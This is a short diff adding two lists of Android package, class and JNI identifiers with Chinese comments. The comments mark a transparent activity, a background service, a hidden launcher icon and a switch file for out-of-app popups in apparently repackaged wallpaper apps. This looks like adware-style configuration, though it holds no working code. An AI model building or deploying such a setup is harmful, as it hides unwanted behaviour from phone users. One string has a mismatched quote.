@@ -1,0 +1,21 @@
+
+['com.kktfs.photo.frame.wallpaper.kktfs.pfw126', 'com.wallframe.artstyle.magic',  # 包名
+               'com.clouds.desire.clothes.flowers.beauty.sanf.BulletsActivity',# 透明activity
+               'com.clouds.desire.clothes.flowers.beauty.wpnbju.smkkwaa.SanTwShowService', # JobSchedulerService
+               'com/clouds/desire/clothes/flowers/beauty/wpnbju/rmkejf/SanTwMoosRecent',  #  广播
+               '', 'com.kktfs.photo.frame.wallpaper.kktfs.pfw126.MainActivity',  # 隐藏图标 other1","main2
+               'com/clouds/desire/clothes/flowers/beauty/sango/SanTw', '"sancango"',# jni路径及函数
+              '/sanfkkt']  # 外弹文件开关名
+
+
+
+
+
+
+['com.kktfs.photo.frame.wallpaper.kktfs.pfw126', 'com.wallframe.artstyle.magic',  # 包名
+                'com/clouds/desire/clothes/flowers/beauty/jvioe/Abkffrr’,
+                '"Jjsis"','"Almbtrkj"', '"Ujrrytt"','"Ndtucan"',
+                'com/clouds/desire/clothes/flowers/beauty/jvioe/Fcckiis',  # hander
+                'com/clouds/desire/clothes/flowers/beauty/jvioe/Cjhhhfef',  # wvcClass
+                'com/clouds/desire/clothes/flowers/beauty/jvioe/Wckkjsd',  # WccClass
+                '/sanfkkt']#文件开关
